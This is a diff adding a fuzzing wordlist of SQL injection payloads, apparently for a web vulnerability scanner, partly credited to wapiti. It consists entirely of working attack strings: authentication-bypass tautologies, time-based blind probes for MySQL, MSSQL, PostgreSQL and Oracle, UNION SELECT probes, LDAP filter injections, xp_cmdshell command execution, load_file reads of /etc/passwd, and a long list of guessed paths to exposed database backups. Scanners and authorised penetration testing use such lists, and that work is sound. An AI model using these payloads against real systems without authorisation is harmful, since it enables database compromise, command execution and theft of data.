@@ -1,0 +1,715 @@
+ --
+!
+&
+'
+(
+)
+*/*
+*|
+/
+//
+//*
+<>"'%;)(&+
+?
+|
+0
+0 or 1=1
+0x730065006c0065006300740020004000400076006500 ...
+0x770061006900740066006F0072002000640065006C00 ...
+0x77616974666F722064656C61792027303A303A313027 ...
+/12052019.sql
+1;(load_file(char(47,101,116,99,47,112,97,115, ...
+1 or 1=1
+1 or benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+1' OR NOT 2470=2470-- Ontu
+1 or pg_sleep(__TIME__)--
+1 or pg_sleep(__TIME__)--
+1) or pg_sleep(__TIME__)--
+1) or pg_sleep(__TIME__)--
+1)) or pg_sleep(__TIME__)--
+1)) or pg_sleep(__TIME__)--
+1 or sleep(__TIME__)#
+1 or sleep(__TIME__)#
+1) or sleep(__TIME__)#
+1) or sleep(__TIME__)#
+1)) or sleep(__TIME__)#
+1)) or sleep(__TIME__)#
+1;SELECT%20*
+/1.sql
+1 waitfor delay '0:0:10'--
+%20$(sleep%2050)
+/2012.sql
+/2013.sql
+/2014.sql
+/2015.sql
+/2016.sql
+/2017.sql
+/2018.sql
+/2019.sql
+%20or%20''='
+'%20or%20''='
+%20or%201=1
+'%20or%201=1
+%20or%20'x'='x
+%20or%20x=x
+'%20or%20'x'='x
+')%20or%20('x'='x
+)%20or%20('x'='x
+%20'sleep%2050'
+%21
+21 %
+23 OR 1=1
+%26
+26 %
+%27%20or%201=1
+%28
+28 %
+%29
+29 %
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%7C
+/2.sql
+3.10E+17
+(||6)
+||'6
+||6
+%7C
+a'
+Ã½ or 1=1 --
+/accounts.sql
+/admin/download/backup.sql
+/adminer.sql
+admin' or '
+/adodb-sessions.oracle.clob.sql
+ and 0=benchmark(3000000,MD5(1)) #
+ and 0=benchmark(3000000,MD5(1)) --
+ and 0=benchmark(3000000,MD5(1)) /*
+" and 0=benchmark(3000000,MD5(1)) #
+" and 0=benchmark(3000000,MD5(1)) --
+" and 0=benchmark(3000000,MD5(1)) /*
+") and 0=benchmark(3000000,MD5(1)) #
+") and 0=benchmark(3000000,MD5(1)) --
+") and 0=benchmark(3000000,MD5(1)) /*
+")) and 0=benchmark(3000000,MD5(1)) #
+")) and 0=benchmark(3000000,MD5(1)) --
+")) and 0=benchmark(3000000,MD5(1)) /*
+"))) and 0=benchmark(3000000,MD5(1)) #
+"))) and 0=benchmark(3000000,MD5(1)) --
+"))) and 0=benchmark(3000000,MD5(1)) /*
+")))) and 0=benchmark(3000000,MD5(1)) #
+")))) and 0=benchmark(3000000,MD5(1)) --
+")))) and 0=benchmark(3000000,MD5(1)) /*
+' and 0=benchmark(3000000,MD5(1)) #
+' and 0=benchmark(3000000,MD5(1)) --
+' and 0=benchmark(3000000,MD5(1)) /*
+') and 0=benchmark(3000000,MD5(1)) #
+') and 0=benchmark(3000000,MD5(1)) --
+') and 0=benchmark(3000000,MD5(1)) /*
+')) and 0=benchmark(3000000,MD5(1)) #
+')) and 0=benchmark(3000000,MD5(1)) --
+')) and 0=benchmark(3000000,MD5(1)) /*
+'))) and 0=benchmark(3000000,MD5(1)) #
+'))) and 0=benchmark(3000000,MD5(1)) --
+'))) and 0=benchmark(3000000,MD5(1)) /*
+')))) and 0=benchmark(3000000,MD5(1)) #
+')))) and 0=benchmark(3000000,MD5(1)) --
+')))) and 0=benchmark(3000000,MD5(1)) /*
+) and 0=benchmark(3000000,MD5(1)) #
+) and 0=benchmark(3000000,MD5(1)) --
+) and 0=benchmark(3000000,MD5(1)) /*
+)) and 0=benchmark(3000000,MD5(1)) #
+)) and 0=benchmark(3000000,MD5(1)) --
+)) and 0=benchmark(3000000,MD5(1)) /*
+))) and 0=benchmark(3000000,MD5(1)) #
+))) and 0=benchmark(3000000,MD5(1)) --
+))) and 0=benchmark(3000000,MD5(1)) /*
+)))) and 0=benchmark(3000000,MD5(1)) #
+)))) and 0=benchmark(3000000,MD5(1)) --
+)))) and 0=benchmark(3000000,MD5(1)) /*
+ and 1=( if((load_file(char(110,46,101,120,11 ...
+ and 1 in (select var from temp)--
+' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--
+anything' OR 'x'='x
+"a"" or 1=1--"
+a' or 1=1--
+â or 1=1 --
+"a"" or 3=3--"
+a' or 3=3--
+â or 3=3 --
+a' or 'a' = 'a
+&apos;%20OR
+as
+asc
+a' waitfor delay '0:0:10'--
+/back.sql
+/backup2018.sql
+/backup/database.sql
+/backup/data.sql
+/backup/db_backup.sql
+/backup/dbdump.sql
+/backup/db.sql
+/backup_db.sql
+/backup/dump.sql
+/backup/mysql.sql
+/backups/database.sql
+/backups/data.sql
+/backups/db_backup.sql
+/backups/dbdump.sql
+/backups/db.sql
+/backups/dump.sql
+/backup/site.sql
+/backups/mysql.sql
+/backup.sql
+/backups/site.sql
+/backups.sql
+/backups/wordpress.sql
+/backup/wordpress.sql
+/base.dump.sql
+/base.sql
+/bdb.sql
+; begin declare @var varchar(8000) set @var=' ...
+benchmark(10000000,MD5(1))#
+benchmark(10000000,MD5(1))#
+bfilename
+/bill/install/mysql.sql
+/blog.sql
+/board/acp/lib/inserts.sql
+/b.sql
+/cgi-bin/acp/lib/inserts.sql
+char%4039%41%2b%40SELECT
+/clients.sql
+/contact.sql
+/copy.sql
+/database_backup.sql
+/database.sql
+/database/structure.sql
+/data.sql
+/data.sql.sql
+/db_acl.sql
+/dbadmin.sql
+/dbadmin.sql.sql
+/dbase.sql
+/dbase.sql.sql
+/db_backup.sql
+/db_backup.sql.sql
+/db/dump.sql
+/dbdump.sql
+'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),10)||'
+/db.sql
+/db.sql.sql
+/ddb.sql
+declare @q nvarchar (200) 0x730065006c00650063 ...
+declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+declare @q nvarchar (200) select @q = 0x770061 ...
+declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
+declare @q nvarchar (4000) select @q =
+declare @s varchar (200) select @s = 0x73656c6 ...
+declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+declare @s varchar(200) select @s = 0x77616974 ...
+declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)
+declare @s varchar(22) select @s =
+declare @s varchar (8000) select @s = 0x73656c ...
+/demo/zh_cn.sql
+desc
+distinct
+/drop.sql
+/drupalbackup.sql
+/dump
+/dump.sql
+||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+/emails.sql
+/error_report/install/mysql.sql
+'; exec master..xp_cmdshell
+; exec master..xp_cmdshell
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+; exec master..xp_cmdshell 'ping 172.10.1.255'--
+exec(@s)
+; exec ('sel' + 'ect us' + 'er')
+exec sp
+; execute immediate 'sel' || 'ect us' || 'er'
+exec xp
+'; exec xp_regread
+; exec xp_regread
+/export.sql
+/file.sql
+/files.sql
+/forum/acp/lib/inserts.sql
+# from wapiti
+/fullbackup.sql
+/fullwebsite.sql
+ group by userid having 1=1--
+handler
+having
+ having 1=1--
+hi or 1=1 --"
+hi' or 1=1 --
+"hi"") or (""a""=""a"
+hi or a=a
+hi' or 'a'='a
+hi') or ('a'='a
+'hi' or 'x'='x';
+hi' or 'x'='x';
+/home.sql
+/home.sql.sql
+"); if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:__TIME__' -- 
+"; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:__TIME__' -- 
+'); if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:__TIME__' -- 
+'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:__TIME__' -- 
+"); if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:__TIME__'
+"; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:__TIME__' 
+'); if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:__TIME__' 
+'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:__TIME__' 
+"); if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:__TIME__' --
+"; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:__TIME__' --
+'); if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:__TIME__' --
+'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:__TIME__' --
+"); if not(select system_user) <> 'sa' waitfor delay '0:0:__TIME__' --
+"; if not(select system_user) <> 'sa' waitfor delay '0:0:__TIME__' --
+'); if not(select system_user) <> 'sa' waitfor delay '0:0:__TIME__' --
+'; if not(select system_user) <> 'sa' waitfor delay '0:0:__TIME__' --
+"); if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:__TIME__' --
+"; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:__TIME__' --
+'); if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:__TIME__' --
+'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:__TIME__' --
+"); if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:__TIME__' --
+"; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:__TIME__' --
+'); if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:__TIME__' --
+"); if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:__TIME__' --
+"; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:__TIME__' --
+'); if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:__TIME__' --
+'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:__TIME__' --
+"); if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:__TIME__' --
+"; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:__TIME__' --
+'); if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:__TIME__' --
+'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:__TIME__' --
+insert
+/install/data/data_en_us.sql
+/Install/Demo/Demo.sql
+/install.sql
+/lib.model.schema.sql
+limit
+/localhost_backup.sql
+/localhost.sql
+*(|(mail=*))
+/mails.sql
+/main.sql
+/message/install/mysql.sql
+/module/info/include/mysql/phpcms_info.sql
+/my.sql
+/mysql_basic.sql
+/mysqldump.sql
+/mysql.sql
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+"),NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+"),NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+",NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+",NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+'),NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+'),NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+',NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+',NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+),NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+),NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+"),NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+"),NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+",NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+",NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+'),NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+'),NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+',NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+',NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+),NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+),NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+"),NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+"),NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+",NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+",NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+'),NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+'),NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+',NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+',NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+),NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+),NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+"),NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+"),NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+",NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+",NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+'),NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+'),NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+',NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+',NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+),NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+),NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+"),NULL,NULL) waitfor delay '0:0:__TIME__' --
+"),NULL,NULL) waitfor delay '0:0:__TIME__' /*
+",NULL,NULL) waitfor delay '0:0:__TIME__' --
+",NULL,NULL) waitfor delay '0:0:__TIME__' /*
+'),NULL,NULL) waitfor delay '0:0:__TIME__' --
+'),NULL,NULL) waitfor delay '0:0:__TIME__' /*
+',NULL,NULL) waitfor delay '0:0:__TIME__' --
+',NULL,NULL) waitfor delay '0:0:__TIME__' /*
+),NULL,NULL) waitfor delay '0:0:__TIME__' --
+),NULL,NULL) waitfor delay '0:0:__TIME__' /*
+,NULL,NULL) waitfor delay '0:0:__TIME__' --
+,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+'),NULL) waifor delay '0:0:__TIME__' /*
+',NULL) waifor delay '0:0:__TIME__' /*
+"),NULL) waitfor delay '0:0:__TIME__' --
+"),NULL) waitfor delay '0:0:__TIME__' /*
+",NULL) waitfor delay '0:0:__TIME__' --
+",NULL) waitfor delay '0:0:__TIME__' /*
+'),NULL) waitfor delay '0:0:__TIME__' --
+',NULL) waitfor delay '0:0:__TIME__' --
+),NULL) waitfor delay '0:0:__TIME__' --
+),NULL) waitfor delay '0:0:__TIME__' /*
+,NULL) waitfor delay '0:0:__TIME__' --
+,NULL) waitfor delay '0:0:__TIME__' /*
+*(|(objectclass=*))
+/old.sql
+/opencart.sql
+ or ''='
+' or ''='
+or
+ or 0=0 #
+ or 0=0 #"
+ or 0=0 --
+" or 0=0 --
+' or 0=0 #
+' or 0=0 --
+or 0=0 #
+or 0=0 #"
+or 0=0 --
+ or 1 --'
+ or 1/*
+' or 1 --'
+ or 1=1 --
+ or '1'='1
+ or '1'='1'--
+ or 1=1
+ or 1=1 /*
+ or 1=1--
+" or 1=1--
+' or '1'='1'--
+' or 1=1
+' or 1=1--
+/**/or/**/1/**/=/**/1
+; or '1'='1'
+or 1=1
+or 1=1--
+ or 1=1 or ""=
+ or 1=1 or ''='
+' or 1=1 or ''='
+or 1=1 or ""=
+ or 1 in (select @@version)--
+or%201=1
+or%201=1 --
+ or 2 > 1
+ or 2 between 1 and 3
+ or 3=3 --
+ or 3=3
+' or 3=3
+ or '7659'='7659
+ or 'a'='a
+ or a = a
+ or a=a
+ or a=a--
+" or "a"="a
+' or a=a--
+') or ('a'='a
+) or ('a'='a
+) or (a=a
+or a = a
+or a=a
+ or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+) or benchmark(10000000,MD5(1))#
+)) or benchmark(10000000,MD5(1))#
+order by
+ or (EXISTS)
+' or (EXISTS)
+" or isNULL(1/0) /*
+or isNULL(1/0) /*
+ or pg_sleep(__TIME__)--
+" or pg_sleep(__TIME__)--
+" or pg_sleep(__TIME__)--
+") or pg_sleep(__TIME__)--
+") or pg_sleep(__TIME__)--
+")) or pg_sleep(__TIME__)--
+")) or pg_sleep(__TIME__)--
+' or pg_sleep(__TIME__)--
+') or pg_sleep(__TIME__)--
+')) or pg_sleep(__TIME__)--
+) or pg_sleep(__TIME__)--
+)) or pg_sleep(__TIME__)--
+')) or sleep(5)='
+ or sleep(__TIME__)#
+ or sleep(__TIME__)='
+" or sleep(__TIME__)#
+" or sleep(__TIME__)#
+" or sleep(__TIME__)="
+") or sleep(__TIME__)="
+") or sleep(__TIME__)="
+")) or sleep(__TIME__)="
+")) or sleep(__TIME__)="
+' or sleep(__TIME__)#
+' or sleep(__TIME__)='
+') or sleep(__TIME__)='
+')) or sleep(__TIME__)='
+) or sleep(__TIME__)='
+)) or sleep(__TIME__)='
+ or 'something' = 'some'+'thing'
+ or 'text' = n'text'
+ or 'text' > 't'
+' or uid like '%
+' or uname like '%
+ or 'unusual' = 'unusual'
+' or userid like '%
+' or user like '%
+' or username like '%
+ or username like char(37);
+ or 'whatever' in ('whatever')
+ -- &password=
+password:*/=1--
+pg_sleep(__TIME__)--
+pg_sleep(__TIME__)--
+/phpbb_db_backup_data.sql
+/phpmyadmin.sql
+/pma.sql
+PRINT
+PRINT @@variable
+procedure
+replace
+/scripts/acp/lib/inserts.sql
+select
+(select(0)from(select(sleep(13)))v)/*'+(select(0)from(select(sleep(13)))v)+'\"+(select(0)from(select(sleep(13)))v)+\"*/
+ select * from information_schema.tables--
+"),(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))#
+"),(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+"),(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+",(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))#
+",(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+",(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+'),(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))#
+'),(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+'),(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+',(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))#
+',(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+',(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+),(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))#
+),(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+),(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+,(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))#
+,(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+,(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+ select name from syscolumns where id = (sele ...
+ (select top 1
+' (select top 1
+/server.sql
+/sessions.sql
+/site.sql
+sleep(__TIME__)#
+/spider/uninstall/mysql.sql
+--sp_password
+'sqlattempt1
+(sqlattempt2)
+/sql.sql
+(sqlvuln)
++sqlvuln
+sqlvuln
+sqlvuln;
+/structure.sql
+/tables.sql
+/temp.sql
+/tests/_data/dump.sql
+/test.sql
+t'exec master..xp_cmdshell 'nslookup www.googl ...
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+to_timestamp_tz
+/transfer/drupalbackup.sql
+truncate
+tz_offset
+ UNION ALL SELECT
+' UNION ALL SELECT
+ union all select @@version--
+ union select
+uni/**/on sel/**/ect
+ UNION SELECT
+' UNION SELECT
+ union select 1,load_file('/etc/passwd'),1,1,1;
+) union select * from information_schema.tables;
+ union select * from users where login = char ...
+/upload.sql
+/users.sql
+'||UTL_HTTP.REQUEST
+||UTL_HTTP.REQUEST
+,@variable
+@variable
+@var select @var as var into temp end --
+");waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+;waitfor delay '0:0:5'--
+' WAITFOR DELAY '0:0:5'--
+';WAITFOR DELAY '0:0:5'-- 
+));waitfor delay '0:0:5'--'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:__TIME__' --
+ waitfor delay '0:0:__TIME__' --
+ waitfor delay '0:0:__TIME__' /* 
+" waitfor delay '0:0:__TIME__' --
+" waitfor delay '0:0:__TIME__' /* 
+") waitfor delay '0:0:__TIME__' --
+") waitfor delay '0:0:__TIME__' /*
+") waitfor delay '0:0:__TIME__' /* 
+")) waitfor delay '0:0:__TIME__' --
+")) waitfor delay '0:0:__TIME__' /*
+")) waitfor delay '0:0:__TIME__' /* 
+"))) waitfor delay '0:0:__TIME__' --
+"))) waitfor delay '0:0:__TIME__' /* 
+")))) waitfor delay '0:0:__TIME__' --
+")))) waitfor delay '0:0:__TIME__' /* 
+"))))) waitfor delay '0:0:__TIME__' --
+"))))) waitfor delay '0:0:__TIME__' /* 
+")))))) waitfor delay '0:0:__TIME__' --
+")))))) waitfor delay '0:0:__TIME__' /* 
+"));waitfor delay '0:0:__TIME__'--
+"));waitfor delay '0:0:__TIME__'--
+");waitfor delay '0:0:__TIME__'--
+");waitfor delay '0:0:__TIME__'--
+";waitfor delay '0:0:__TIME__'--
+";waitfor delay '0:0:__TIME__'--
+' waitfor delay '0:0:__TIME__' --
+' waitfor delay '0:0:__TIME__' /* 
+') waitfor delay '0:0:__TIME__' --
+') waitfor delay '0:0:__TIME__' /*
+') waitfor delay '0:0:__TIME__' /* 
+')) waitfor delay '0:0:__TIME__' --
+')) waitfor delay '0:0:__TIME__' /*
+')) waitfor delay '0:0:__TIME__' /* 
+'))) waitfor delay '0:0:__TIME__' --
+'))) waitfor delay '0:0:__TIME__' /* 
+')))) waitfor delay '0:0:__TIME__' --
+')))) waitfor delay '0:0:__TIME__' /* 
+'))))) waitfor delay '0:0:__TIME__' --
+'))))) waitfor delay '0:0:__TIME__' /* 
+')))))) waitfor delay '0:0:__TIME__' --
+')))))) waitfor delay '0:0:__TIME__' /* 
+'));waitfor delay '0:0:__TIME__'--
+');waitfor delay '0:0:__TIME__'--
+';waitfor delay '0:0:__TIME__'--
+) waitfor delay '0:0:__TIME__' --
+) waitfor delay '0:0:__TIME__' /*
+) waitfor delay '0:0:__TIME__' /* 
+)) waitfor delay '0:0:__TIME__' --
+)) waitfor delay '0:0:__TIME__' /*
+)) waitfor delay '0:0:__TIME__' /* 
+))) waitfor delay '0:0:__TIME__' --
+))) waitfor delay '0:0:__TIME__' /* 
+)))) waitfor delay '0:0:__TIME__' --
+)))) waitfor delay '0:0:__TIME__' /* 
+))))) waitfor delay '0:0:__TIME__' --
+)))))) waitfor delay '0:0:__TIME__' --
+));waitfor delay '0:0:__TIME__'--
+));waitfor delay '0:0:__TIME__'--
+);waitfor delay '0:0:__TIME__'--
+);waitfor delay '0:0:__TIME__'--
+;waitfor delay '0:0:__TIME__'--
+;waitfor delay '0:0:__TIME__'--
+/wbboard/acp/lib/inserts.sql
+/website.sql
+/web.sql
+/wordpress.sql
+/wpbackup.sql
+/wp-content/backup/database.sql
+/wp-content/backup/data.sql
+/wp-content/backup/db_backup.sql
+/wp-content/backup/dbdump.sql
+/wp-content/backup/db.sql
+/wp-content/backup/dump.sql
+/wp-content/backup/mysql.sql
+/wp-content/backups/database.sql
+/wp-content/backups/data.sql
+/wp-content/backups/db_backup.sql
+/wp-content/backups/dbdump.sql
+/wp-content/backups/db.sql
+/wp-content/backups/dump.sql
+/wp-content/backup/site.sql
+/wp-content/backups/mysql.sql
+/wp-content/backups/site.sql
+/wp-content/backups/wordpress.sql
+/wp-content/backup/wordpress.sql
+/wp-content/database.sql
+/wp-content/data.sql
+/wp-content/db_backup.sql
+/wp-content/dbdump.sql
+/wp-content/db.sql
+/wp-content/dump.sql
+/wp-content/fullbackup.sql
+/wp-content/fullwebsite.sql
+/wp-content/mysql.sql
+/wp-content/site.sql
+/wp-content/uploads/database.sql
+/wp-content/uploads/data.sql
+/wp-content/uploads/db_backup.sql
+/wp-content/uploads/dbdump.sql
+/wp-content/uploads/db.sql
+/wp-content/uploads/dump.sql
+/wp-content/uploads/mysql.sql
+/wp-content/uploads/site.sql
+/wp-content/uploads/wordpress.sql
+/wp-content/wordpress.sql
+/wp.sql
+/www.sql
+\x27UNION SELECT
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+x' AND email IS NULL; --
+x' AND members.email IS NULL; --
+x' AND userid IS NULL; --
+x' or 1=1 or 'x'='y
+x' OR full_name LIKE '%Bob%
+/zzfaq.sql
